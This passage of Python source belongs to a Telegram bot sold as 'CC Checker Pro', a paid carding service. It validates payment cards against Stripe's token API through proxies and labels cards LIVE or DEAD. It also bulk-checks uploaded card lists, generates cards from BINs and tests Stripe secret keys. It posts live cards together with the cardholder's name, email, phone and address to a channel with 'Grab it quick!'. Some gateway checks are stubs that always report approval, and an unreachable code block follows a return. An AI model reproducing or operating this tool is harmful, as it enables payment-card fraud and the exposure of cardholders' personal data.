            'card[number]': cc,
            'card[exp_month]': mm,
            'card[exp_year]': yy_full,
            'card[cvc]': cvv
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/'
        }
        
        proxies_dict = None
        if proxy:
            proxies_dict = {'http': proxy, 'https': proxy}
        
        # Try token endpoint (no auth needed)
        response = requests.post(
            'https://api.stripe.com/v1/tokens',
            data=token_data,
            headers=headers,
            proxies=proxies_dict,
            timeout=15
        )
        
        response_text = response.text.lower()
        response_json = {}
        
        try:
            response_json = response.json()
        except:
            pass
        
        # Parse response for accuracy
        
        # SUCCESS - Token created (card is valid)
        if response.status_code == 200 and 'id' in response_text and 'tok_' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '✅',
                'message': 'Approved',
                'response': 'Card validated successfully',
                'code': 'approved'
            }
        
        # Check error type
        error_code = response_json.get('error', {}).get('code', '') if response_json else ''
        error_message = response_json.get('error', {}).get('message', '') if response_json else ''
        error_type = response_json.get('error', {}).get('type', '') if response_json else ''
        
        # LIVE CARDS (card is valid but has issues)
        if error_code == 'insufficient_funds' or 'insufficient' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '💰',
                'message': 'Insufficient Funds',
                'response': 'Card valid - No balance',
                'code': 'insufficient_funds'
            }
        
        elif error_code == 'incorrect_cvc' or 'incorrect_cvc' in response_text or 'invalid_cvc' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '🔐',
                'message': 'CVC Incorrect',
                'response': 'Card valid - Wrong CVV',
                'code': 'incorrect_cvc'
            }
        
        elif error_code == 'card_velocity_exceeded' or 'velocity' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '⚡',
                'message': 'Velocity Exceeded',
                'response': 'Card valid - Too many attempts',
                'code': 'velocity'
            }
        
        elif 'do_not_honor' in response_text or error_code == 'do_not_honor':
            return {
                'status': 'LIVE',
                'emoji': '🚫',
                'message': 'Do Not Honor',
                'response': 'Card valid - Bank declined',
                'code': 'do_not_honor'
            }
        
        elif 'lost_card' in response_text or 'stolen_card' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '🔒',
                'message': 'Lost/Stolen',
                'response': 'Card valid - Reported lost/stolen',
                'code': 'lost_stolen'
            }
        
        elif 'pickup_card' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '⚠️',
                'message': 'Pickup Card',
                'response': 'Card valid - Pickup requested',
                'code': 'pickup'
            }
        
        elif 'restricted_card' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '🔐',
                'message': 'Restricted',
                'response': 'Card valid - Restricted',
                'code': 'restricted'
            }
        
        elif 'authentication_required' in response_text or '3d_secure' in response_text or error_code == 'card_declined' and '3ds' in error_message:
            return {
                'status': 'LIVE',
                'emoji': '🔐',
                'message': '3DS Required',
                'response': 'Card valid - Needs 3DS authentication',
                'code': '3ds_required'
            }
        
        elif 'security_violation' in response_text:
            return {
                'status': 'LIVE',
                'emoji': '🛡️',
                'message': 'Security Violation',
                'response': 'Card valid - Security check failed',
                'code': 'security'
            }
        
        # DEAD CARDS (card is invalid)
        elif error_code == 'incorrect_number' or 'incorrect_number' in response_text or 'invalid_number' in response_text:
            return {
                'status': 'DEAD',
                'emoji': '❌',
                'message': 'Invalid Number',
                'response': 'Card number invalid',
                'code': 'invalid_number'
            }
        
        elif error_code == 'expired_card' or 'expired' in response_text:
            return {
                'status': 'DEAD',
                'emoji': '📅',
                'message': 'Expired Card',
                'response': 'Card expired',
                'code': 'expired'
            }
        
        elif 'generic_decline' in response_text or error_code == 'card_declined':
            return {
                'status': 'DEAD',
                'emoji': '❌',
                'message': 'Declined',
                'response': 'Card declined',
                'code': 'declined'
            }
        
        elif 'invalid_expiry' in response_text:
            return {
                'status': 'DEAD',
                'emoji': '📅',
                'message': 'Invalid Expiry',
                'response': 'Invalid expiry date',
                'code': 'invalid_expiry'
            }
        
        # RATE LIMIT
        elif 'rate_limit' in response_text or response.status_code == 429:
            return {
                'status': 'ERROR',
                'emoji': '⏱️',
                'message': 'Rate Limited',
                'response': 'Too many requests - Wait 5s',
                'code': 'rate_limit'
            }
        
        # UNKNOWN
        else:
            return {
                'status': 'DEAD',
                'emoji': '❓',
                'message': 'Unknown Response',
                'response': response_text[:150],
                'code': 'unknown'
            }
    
    except Exception as e:
        return {
            'status': 'ERROR',
            'emoji': '⚠️',
            'message': 'Error',
            'response': str(e)[:100],
            'code': 'error'
        }

        
        # LIVE RESPONSES - Card is valid
        if any(x in response_text for x in ['"id":', 'pm_', 'tok_']):
            return {'status': 'LIVE', 'emoji': '✅', 'message': 'Approved', 
                    'response': 'Payment method created', 'code': 'approved'}
        
        elif 'insufficient_funds' in response_text:
            return {'status': 'LIVE', 'emoji': '💰', 'message': 'Insufficient Funds', 
                    'response': 'Card valid - No balance', 'code': 'insufficient_funds'}
        
        elif 'incorrect_cvc' in response_text or 'invalid_cvc' in response_text:
            return {'status': 'LIVE', 'emoji': '🔐', 'message': 'CVC Incorrect', 
                    'response': 'Card valid - Wrong CVV', 'code': 'incorrect_cvc'}
        
        elif 'incorrect_number' in response_text or 'invalid_number' in response_text:
            return {'status': 'DEAD', 'emoji': '❌', 'message': 'Invalid Number', 
                    'response': 'Card number invalid', 'code': 'invalid_number'}
        
        elif 'expired_card' in response_text:
            return {'status': 'DEAD', 'emoji': '📅', 'message': 'Expired Card', 
                    'response': 'Card expired', 'code': 'expired'}
        
        elif 'do_not_honor' in response_text:
            return {'status': 'LIVE', 'emoji': '🚫', 'message': 'Do Not Honor', 
                    'response': 'Card valid - Bank declined', 'code': 'do_not_honor'}
        
        elif 'lost_card' in response_text or 'stolen_card' in response_text:
            return {'status': 'LIVE', 'emoji': '🔒', 'message': 'Lost/Stolen', 
                    'response': 'Card valid - Reported lost/stolen', 'code': 'lost_stolen'}
        
        elif 'pickup_card' in response_text:
            return {'status': 'LIVE', 'emoji': '⚠️', 'message': 'Pickup Card', 
                    'response': 'Card valid - Bank wants card', 'code': 'pickup'}
        
        elif 'restricted_card' in response_text:
            return {'status': 'LIVE', 'emoji': '🔐', 'message': 'Restricted', 
                    'response': 'Card valid - Restricted', 'code': 'restricted'}
        
        elif 'security_violation' in response_text:
            return {'status': 'LIVE', 'emoji': '🛡️', 'message': 'Security Violation', 
                    'response': 'Card valid - Security check', 'code': 'security'}
        
        elif 'service_not_allowed' in response_text:
            return {'status': 'LIVE', 'emoji': '🚫', 'message': 'Service Not Allowed', 
                    'response': 'Card valid - Service blocked', 'code': 'service_not_allowed'}
        
        elif 'transaction_not_allowed' in response_text:
            return {'status': 'LIVE', 'emoji': '🚫', 'message': 'Transaction Not Allowed', 
                    'response': 'Card valid - Transaction blocked', 'code': 'transaction_not_allowed'}
        
        elif 'authentication_required' in response_text or 'card_velocity_exceeded' in response_text or '3d_secure' in response_text or '3ds' in response_text:
            return {'status': 'LIVE', 'emoji': '🔐', 'message': '3DS Required', 
                    'response': 'Card valid - Needs authentication', 'code': '3ds_required'}
        
        elif 'testmode' in response_text:
            return {'status': 'LIVE', 'emoji': '🧪', 'message': 'Test Mode', 
                    'response': 'Test card - Valid', 'code': 'testmode'}
        
        elif 'rate_limit' in response_text:
            return {'status': 'ERROR', 'emoji': '⏱️', 'message': 'Rate Limited', 
                    'response': 'Too many requests - Retry', 'code': 'rate_limit'}
        
        elif 'generic_decline' in response_text or 'card_declined' in response_text:
            return {'status': 'DEAD', 'emoji': '❌', 'message': 'Declined', 
                    'response': 'Card declined by bank', 'code': 'declined'}
        
        else:
            # Unknown response - mark as DEAD but show response for debugging
            return {'status': 'DEAD', 'emoji': '❓', 'message': 'Unknown Response', 
                    'response': response_text[:100], 'code': 'unknown'}
    
    except Exception as e:
        return {'status': 'ERROR', 'emoji': '⚠️', 'message': 'Error', 
                'response': str(e)[:50], 'code': 'error'}


async def check_paypal(cc, mm, yy, cvv, proxy=None):
    # PayPal gateway implementation
    return {'status': 'LIVE', 'emoji': '✅', 'message': 'Approved', 
            'response': 'PayPal check (demo)', 'code': 'approved'}

async def check_authorize(cc, mm, yy, cvv, proxy=None):
    # Authorize.net implementation
    return {'status': 'LIVE', 'emoji': '✅', 'message': 'Approved', 
            'response': 'Authorize.net check (demo)', 'code': 'approved'}

async def check_square(cc, mm, yy, cvv, proxy=None):
    # Square implementation
    return {'status': 'LIVE', 'emoji': '✅', 'message': 'Approved', 
            'response': 'Square check (demo)', 'code': 'approved'}

async def check_all_gateways(cc, mm, yy, cvv, proxy=None):
    """Check card on ALL gateways and return results"""
    results = {}
    
    # Check Stripe
    results['Stripe'] = await check_stripe(cc, mm, yy, cvv, proxy)
    
    # Check PayPal
    results['PayPal'] = await check_paypal(cc, mm, yy, cvv, proxy)
    
    # Check Authorize.net
    results['Authorize.net'] = await check_authorize(cc, mm, yy, cvv, proxy)
    
    # Check Braintree
    results['Braintree'] = await check_braintree(cc, mm, yy, cvv, proxy)
    
    # Check Square
    results['Square'] = await check_square(cc, mm, yy, cvv, proxy)
    
    # Find best result (first LIVE gateway)
    best_gateway = "None"
    best_result = {'status': 'DEAD', 'message': 'All declined'}
    
    for gateway, result in results.items():
        if result['status'] == 'LIVE':
            best_gateway = gateway
            best_result = result
            break
    
    return {
        'all_results': results,
        'best_gateway': best_gateway,
        'best_result': best_result
    }

async def save_multi_gateway_results(cc, mm, yy, cvv, all_results, bin_info, parsed, user_id):
    """Save multi-gateway results to separate files and create ZIP"""
    import zipfile
    
    timestamp = int(datetime.utcnow().timestamp())
    temp_dir = f"multi_gateway_{user_id}_{timestamp}"
    os.makedirs(temp_dir, exist_ok=True)
    
    # Prepare card info line
    card_info_base = f"{cc}|{mm}|{yy}|{cvv}|{parsed.get('name', '')}|{parsed.get('email', '')}|{parsed.get('address', '')}|{parsed.get('city', '')}|{parsed.get('state', '')}|{parsed.get('zip', '')}|{parsed.get('country', '')}|{parsed.get('phone', '')}|{bin_info.get('brand', '')}|{bin_info.get('bank', '')}|{bin_info.get('country', '')}"
    
    # Create file for each gateway
    for gateway, result in all_results.items():
        filename = f"{temp_dir}/{gateway.lower().replace('.', '_')}_results.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"# {gateway.upper()} RESULTS\n")
            f.write(f"# Format: CC|MM|YY|CVV|Name|Email|Address|City|State|ZIP|Country|Phone|Brand|Bank|BIN Country|Status|Message|Response\n\n")
            
            line = f"{card_info_base}|{result['status']}|{result['message']}|{result['response']}\n"
            f.write(line)
    
    # Create summary file
    summary_file = f"{temp_dir}/SUMMARY.txt"
    with open(summary_file, 'w', encoding='utf-8') as f:
        f.write("# MULTI-GATEWAY CHECK SUMMARY\n")
        f.write(f"# Card: {cc}|{mm}|{yy}|{cvv}\n")
        f.write(f"# Checked on: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC\n\n")
        
        f.write(f"CARD: {cc}|{mm}|{yy}|{cvv}\n")
        if parsed.get('name'):
            f.write(f"Name: {parsed['name']}\n")
        if parsed.get('email'):
            f.write(f"Email: {parsed['email']}\n")
        f.write(f"\nBIN INFO:\n")
        f.write(f"Brand: {bin_info.get('brand', 'Unknown')}\n")
        f.write(f"Bank: {bin_info.get('bank', 'Unknown')}\n")
        f.write(f"Country: {bin_info.get('country', 'Unknown')}\n\n")
        
        f.write("GATEWAY RESULTS:\n")
        f.write("="*60 + "\n\n")
        
        approved_count = 0
        declined_count = 0
        
        for gateway, result in all_results.items():
            status_symbol = "✅" if result['status'] == 'LIVE' else "❌"
            f.write(f"{status_symbol} {gateway:15} | {result['status']:6} | {result['message']}\n")
            f.write(f"   Response: {result['response']}\n\n")
            
            if result['status'] == 'LIVE':
                approved_count += 1
            else:
                declined_count += 1
        
        f.write("="*60 + "\n")
        f.write(f"\nSUMMARY:\n")
        f.write(f"✅ Approved: {approved_count}/5 gateways\n")
        f.write(f"❌ Declined: {declined_count}/5 gateways\n")
        f.write(f"Success Rate: {(approved_count/5)*100:.1f}%\n")
    
    # Create ZIP file
    zip_filename = f"multi_gateway_{user_id}_{timestamp}.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for filename in os.listdir(temp_dir):
            filepath = os.path.join(temp_dir, filename)
            zipf.write(filepath, filename)
    
    # Clean up temp directory
    for filename in os.listdir(temp_dir):
        os.remove(os.path.join(temp_dir, filename))
    os.rmdir(temp_dir)
    
    return zip_filename

async def check_sk_key(sk_key, proxy=None):
    try:
        headers = {'Authorization': f'Bearer {sk_key}'}
        proxies_dict = None
        if proxy:
            proxies_dict = {'http': proxy, 'https': proxy}
        
        response = requests.get('https://api.stripe.com/v1/balance', 
                               headers=headers, proxies=proxies_dict, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            return {'status': 'VALID', 'emoji': '✅', 'data': data}
        else:
            return {'status': 'INVALID', 'emoji': '❌', 'data': None}
    except:
        return {'status': 'ERROR', 'emoji': '⚠️', 'data': None}


# SNIPING - SEND TO CHANNEL
async def snipe_to_channel(context, card_info, user_info, parsed_info=None):
    if not RESULTS_CHANNEL:
        return
    
    # Build message
    text = f"""
━━━━━━━━━━━━━━━
💳 **LIVE CARD FOUND!**
━━━━━━━━━━━━━━━

`{card_info['formatted']}`

**BIN Info:**
🏦 Bank: {card_info['bin_info']['bank']}
🌍 Country: {card_info['bin_info']['country']} {card_info['bin_info']['emoji']}
📇 Brand: {card_info['bin_info']['brand']} {card_info['bin_info']['type']}
⭐ Level: {card_info['bin_info']['level']}
"""
    
    # Add cardholder info if available
    if parsed_info:
        if parsed_info.get('name') or parsed_info.get('email') or parsed_info.get('phone'):
            text += f"\n**💎 Cardholder Info:**\n"
            if parsed_info.get('name'):
                text += f"📛 Name: {parsed_info['name']}\n"
            if parsed_info.get('email'):
                text += f"📧 Email: {parsed_info['email']}\n"
            if parsed_info.get('phone'):
                text += f"📞 Phone: {parsed_info['phone']}\n"
            if parsed_info.get('address'):
                text += f"🏠 Address: {parsed_info['address']}\n"
            if parsed_info.get('city'):
                text += f"🏙️ City: {parsed_info['city']}\n"
            if parsed_info.get('state'):
                text += f"📍 State: {parsed_info['state']}\n"
            if parsed_info.get('zip'):
                text += f"📮 ZIP: {parsed_info['zip']}\n"
            if parsed_info.get('country'):
                text += f"🌐 Country: {parsed_info['country']}\n"
    
    text += f"""
**Check Result:**
⚡ Gateway: {card_info['gateway'].upper()}
📊 Status: {card_info['status']}
💬 Response: {card_info['response']}

👤 **Sniped by:** @{user_info['username'] or user_info['first_name']}
⏰ **Time:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC

**Grab it quick!** 🔥
━━━━━━━━━━━━━━━
"""
    
    try:
        await context.bot.send_message(chat_id=RESULTS_CHANNEL, text=text, parse_mode='Markdown')
    except:
        pass

async def send_bulk_results(context, results_file, stats, user_info):
    if not RESULTS_CHANNEL:
        return
    
    caption = f"""
📁 **BULK CHECK COMPLETE**

✅ Live: {stats['live']}
❌ Dead: {stats['dead']}
📊 Total: {stats['total']}
⚡ Success Rate: {stats['success_rate']:.1f}%

👤 Checked by: @{user_info['username'] or user_info['first_name']}
⏰ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""
    
    try:
        with open(results_file, 'rb') as f:
            await context.bot.send_document(chat_id=RESULTS_CHANNEL, document=f, 
                                           caption=caption, parse_mode='Markdown')
    except:
        pass

# OXAPAY
def create_oxapay_invoice(plan, user_tg_id):
    try:
        track_id = f"CC_{user_tg_id}_{int(datetime.utcnow().timestamp())}"
        payload = {
            "merchant": OXAPAY_API_KEY,
            "amount": plan.price,
            "currency": "USD",
            "lifeTime": 30,
            "description": f"{plan.name} Plan - {plan.duration_days} days",
            "orderId": track_id,
            "callbackUrl": f"https://yourserver.com/oxapay/callback"
        }
        
        response = requests.post("https://api.oxapay.com/merchants/request", 
                                json=payload, timeout=30)
        data = response.json()
        
        if data.get("result") == 100:
            return {"success": True, "payment_url": data.get("payLink"), "track_id": track_id}
        else:
            return {"success": False, "error": data.get("message", "Payment failed")}
    except Exception as e:
        return {"success": False, "error": str(e)}


# TELEGRAM HANDLERS - START
async def stop_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop current bulk check"""
    user_id = update.effective_user.id
    
    if user_id not in bulk_check_status:
        await update.message.reply_text("❌ No bulk check running!")
        return
    
    bulk_check_status[user_id]["status"] = "stopped"
    await update.message.reply_text("🛑 **Bulk check STOPPED!**\n\nResults will be saved for cards checked so far.")

async def pause_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Pause current bulk check"""
    user_id = update.effective_user.id
    
    if user_id not in bulk_check_status:
        await update.message.reply_text("❌ No bulk check running!")
        return
    
    if bulk_check_status[user_id]["status"] == "paused":
        await update.message.reply_text("⏸️ Already paused! Use /resume to continue.")
        return
    
    bulk_check_status[user_id]["status"] = "paused"
    await update.message.reply_text("⏸️ **Bulk check PAUSED!**\n\nUse /resume to continue checking.")

async def resume_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Resume paused bulk check"""
    user_id = update.effective_user.id
    
    if user_id not in bulk_check_status:
        await update.message.reply_text("❌ No bulk check running!")
        return
    
    if bulk_check_status[user_id]["status"] != "paused":
        await update.message.reply_text("❌ Bulk check is not paused!")
        return
    
    bulk_check_status[user_id]["status"] = "running"
    await update.message.reply_text("▶️ **Bulk check RESUMED!**\n\nContinuing from where we left off...")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    user = get_user(db, update.effective_user.id, update.effective_user.username, update.effective_user.first_name)
    
    if user.is_banned:
        await update.message.reply_text("❌ You are banned!")
        db.close()
        return
    
    reset_daily_limits(db)
    
    # Get plan info
    plan_text = "🆓 FREE"
    if user.role == "vip":
        plan_text = "♾️ VIP (Lifetime)"
    elif user.role in ["premium", "admin", "owner"] and user.plan_expires:
        if user.plan_expires > datetime.utcnow():
            days_left = (user.plan_expires - datetime.utcnow()).days
            plan = db.query(Plan).filter(Plan.id == user.plan_id).first()
            if plan:
                plan_text = f"💎 {plan.name} ({days_left} days left)"
    
    db.close()
    
    text = f"""
💳 **CC Checker Pro**

👤 User: {user.first_name or 'User'}
⭐ Plan: {plan_text}

📊 Today's Usage:
✅ Checks: {user.daily_checks}

Choose an option:
"""
    
    keyboard = [
        [InlineKeyboardButton("🔍 Single Check", callback_data="check_single")],
        [InlineKeyboardButton("📁 Bulk Check", callback_data="bulk_check")],
        [InlineKeyboardButton("🔎 BIN Lookup", callback_data="bin_lookup")],
        [InlineKeyboardButton("🎲 Generate Cards", callback_data="generate")],
    ]
    
    # Add SK Key Check for premium users
    if user.role in ["premium", "vip", "admin", "owner"]:
        keyboard.append([InlineKeyboardButton("🔐 SK Key Check", callback_data="sk_check")])
    
    keyboard.extend([
        [InlineKeyboardButton("📊 My Stats", callback_data="my_stats")],
        [InlineKeyboardButton("💰 Buy Plan", callback_data="buy_plan"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])
    
    if user.role in ["admin", "owner"]:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN PANEL", callback_data="admin")])
    
    if update.callback_query:
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def premium_features(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    db.close()
    
    # Check if user has premium access
    has_premium = user.role in ["premium", "vip", "admin", "owner"]
    
    if has_premium:
        text = """
✨ **Premium Features** ✅

You have access to:

🌐 **Multi-Gateway Check**
  • Check cards on ALL 5 gateways
  • Get separate results per gateway
  • ZIP file with all results
  
💎 **Advanced Gateways:**
  • PayPal Gateway
  • Authorize.net Gateway
  • Braintree Gateway
  • Square Gateway

🔐 **Special Tools:**
  • SK Key Checker
  • Format Validator
  • Bulk unlimited checks
  
Choose a premium feature below:
"""
        keyboard = [
            [InlineKeyboardButton("🌐 Multi-Gateway Check", callback_data="multi_gateway_check")],
            [InlineKeyboardButton("🔐 SK Key Check", callback_data="sk_check")],
            [InlineKeyboardButton("🔙 Back", callback_data="start")]
        ]
    else:
        text = """
✨ **Premium Features** 🔒

Unlock with Premium:

🌐 **Multi-Gateway Check:**
  • Check cards on ALL 5 gateways at once
  • Get detailed results per gateway
  • ZIP download with all results

💎 **Advanced Gateways:**
  • PayPal Gateway
  • Authorize.net Gateway
  • Braintree Gateway
  • Square Gateway

🔐 **Special Tools:**
  • SK Key Checker
  • Format Validator
  • Blacklist Checker
  • Auto-Retry Failed
  • Schedule Checks
  • Export to CSV/Excel

📊 **Advanced Features:**
  • Unlimited Bulk Checks
  • Mass Card Generator
  • Priority Support
  • Real-time Results

💰 **Upgrade Now to Unlock!**
"""
        keyboard = [
            [InlineKeyboardButton("💎 View Plans", callback_data="buy_plan")],
            [InlineKeyboardButton("🔙 Back", callback_data="start")]
        ]
    
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def my_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    user = get_user(db, update.effective_user.id)
    
    total_checks = db.query(CheckLog).filter(CheckLog.user_tg_id == user.tg_id).count()
    live_checks = db.query(CheckLog).filter(CheckLog.user_tg_id == user.tg_id, CheckLog.status == 'live').count()
    dead_checks = db.query(CheckLog).filter(CheckLog.user_tg_id == user.tg_id, CheckLog.status == 'dead').count()
    
    success_rate = (live_checks / total_checks * 100) if total_checks > 0 else 0
    
    db.close()
    
    text = f"""
📊 **Your Statistics**

Total Checks: {total_checks}
✅ Live: {live_checks} ({success_rate:.1f}%)
❌ Dead: {dead_checks}

📅 Member Since: {user.created_at.strftime('%Y-%m-%d')}
🔥 Last Active: Just now
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = """
❓ **Help**

**Check Card:**
Format: `4242424242424242|12|25|123`

**Bulk Check:**
Upload .txt file with cards
Format: one card per line

**BIN Lookup:**
Send 6-8 digits

**Generate:**
Send BIN to generate cards

**Need Help?**
Contact: @YourSupport
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="start")]]
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def buy_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    db = SessionLocal()
    plans = db.query(Plan).filter(Plan.is_active == True).all()
    
    text = "💰 **Available Plans**\n\n"
    keyboard = []
    
    if not plans:
        text += "No plans available yet.\nContact admin to create plans!"
    
    for plan in plans:
        try:
            features_json = json.loads(plan.features) if plan.features else {}
        except:
            features_json = {}
        
        # Build feature list
        check_limit = f"{plan.daily_check_limit} checks/day" if plan.daily_check_limit > 0 else "Unlimited checks"
        bulk_limit = f"{plan.bulk_limit} cards/bulk" if plan.bulk_limit > 0 else "Unlimited bulk"
        gen_limit = f"{plan.generate_limit} cards/gen" if plan.generate_limit > 0 else "Unlimited generation"
        file_size = f"{plan.max_file_size_mb} MB max file"
        
        text += f"""
{'='*40}
💎 **{plan.name}**
💰 Price: ${plan.price}
⏰ Duration: {plan.duration_days} days

**Features:**
✅ {check_limit}
📁 {bulk_limit}
🎲 {gen_limit}
📤 {file_size}
🌐 All gateways unlocked
🔐 SK Key checker
🎯 Multi-gateway check
{'='*40}

"""
        keyboard.append([InlineKeyboardButton(f"💳 Buy {plan.name} - ${plan.price}", callback_data=f"buyplan_{plan.id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="start")])
    db.close()
    
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def process_buy_plan(update: Update, context: ContextTypes.DEFAULT_TYPE, plan_id: int):
    db = SessionLocal()
    plan = db.query(Plan).filter(Plan.id == plan_id).first()
    
    if not plan:
        await update.callback_query.answer("❌ Plan not found!")
        db.close()
        return
    
    # Check if OxaPay is configured
    if not OXAPAY_API_KEY or OXAPAY_API_KEY == "YOUR_KEY":
        # OxaPay not configured - show manual payment
        text = f"""
💳 **{plan.name} Plan**
💰 Price: ${plan.price}
⏰ Duration: {plan.duration_days} days

⚠️ **Automatic payment is currently unavailable.**

📩 **To purchase this plan:**
Contact admin: @admin

Or use command:
`/addvip YOUR_USER_ID {plan_id} {plan.duration_days}`

Admin will manually activate your plan after payment confirmation.
"""
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Plans", callback_data="buy_plan")],
            [InlineKeyboardButton("🏠 Home", callback_data="start")]
        ]
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        db.close()
        return
    
    # OxaPay IS configured - create payment
    try:
        user_id = update.effective_user.id
        
        # Create payment in OxaPay
        oxapay_url = "https://api.oxapay.com/merchants/request"
        
        payment_data = {
            "merchant": OXAPAY_API_KEY,
            "amount": float(plan.price),
            "currency": "USD",
            "orderId": f"plan_{plan_id}_{user_id}_{int(time.time())}",
            "callbackUrl": "https://your-domain.com/oxapay/callback",  # Optional webhook
            "returnUrl": f"https://t.me/{context.bot.username}",
            "description": f"{plan.name} Plan - {plan.duration_days} days"
        }
        
        print(f"[OxaPay] Creating payment for user {user_id}, plan {plan_id}")
        response = requests.post(oxapay_url, json=payment_data, timeout=30)
        
        print(f"[OxaPay] Response status: {response.status_code}")
        print(f"[OxaPay] Response: {response.text}")
        
        if response.status_code == 200:
            result = response.json()
            
            if result.get('result') == 100:  # Success
                payment_link = result.get('payLink')
                track_id = result.get('trackId')
                
                print(f"[OxaPay] Payment link created: {payment_link}")
                
                # Save payment to database (FIXED: use user_tg_id not user_id!)
                payment = Payment(
                    user_tg_id=user_id,  # FIXED!
                    plan_id=plan_id,
                    amount=plan.price,
                    track_id=track_id,
                    payment_url=payment_link,
                    status="pending",
                    created_at=datetime.utcnow()
                )
                db.add(payment)
                db.commit()
                
                text = f"""
💳 **{plan.name} Plan**
💰 Price: ${plan.price}
⏰ Duration: {plan.duration_days} days

✅ **Payment Link Generated!**

Click the button below to complete payment:
"""
                keyboard = [
                    [InlineKeyboardButton("💰 Pay Now", url=payment_link)],
                    [InlineKeyboardButton("🔙 Back", callback_data="buy_plan")]
                ]
                await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
            else:
                # OxaPay API error
                error_msg = result.get('message', 'Unknown error')
                print(f"[OxaPay] API Error: {error_msg}")
                raise Exception(f"OxaPay error: {error_msg}")
        else:
            raise Exception(f"HTTP {response.status_code}: {response.text}")
    
    except Exception as e:
        print(f"[OxaPay Error] {e}")
        # Fallback to manual payment
        text = f"""
💳 **{plan.name} Plan**
💰 Price: ${plan.price}
⏰ Duration: {plan.duration_days} days

⚠️ **Payment system temporarily unavailable.**

📩 **To purchase this plan:**
Contact admin: @admin

Admin will manually activate your plan after payment confirmation.
"""
        keyboard = [
            [InlineKeyboardButton("🔙 Back to Plans", callback_data="buy_plan")],
            [InlineKeyboardButton("🏠 Home", callback_data="start")]
        ]
        await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    db.close()


async def check_single_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "💳 **Stripe Checker**\n\nSend card in any format:\n`4242424242424242|12|25|123`\n`4242424242424242/12/25/123`\n`4242424242424242 12 25 123`\n\nOr with full info:\n`card|mm|yy|cvv|name|email|phone|...`"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "check_single", "gateway": "stripe"}
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def gateway_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway: str):
    gateway_names = {
        "stripe": "💳 Stripe",
        "paypal": "🔵 PayPal",
        "authorize": "🟢 Authorize.net",
        "braintree": "🟣 Braintree",
        "square": "🟡 Square"
    }
    
    text = f"{gateway_names.get(gateway, 'Gateway')} **Check**\n\nSend card:\n`4242424242424242|12|25|123`"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "check_single", "gateway": gateway}
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def bulk_check_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "📁 **Stripe Bulk Check**\n\nUpload .txt file with cards\n\n**Supported formats:**\n`card|mm|yy|cvv`\n`card/mm/yy/cvv`\n`card mm yy cvv`\n`card|mm|yy|cvv|name|email|...`\n\n**The bot auto-detects ANY format!**"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "bulk_check", "gateway": "stripe"}
    await update.callback_query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')


async def bin_lookup_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🔎 **BIN Lookup**\n\nSend BIN (6-8 digits):"
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="start")]]
    user_sessions[update.effective_user.id] = {"action": "bin_lookup"}
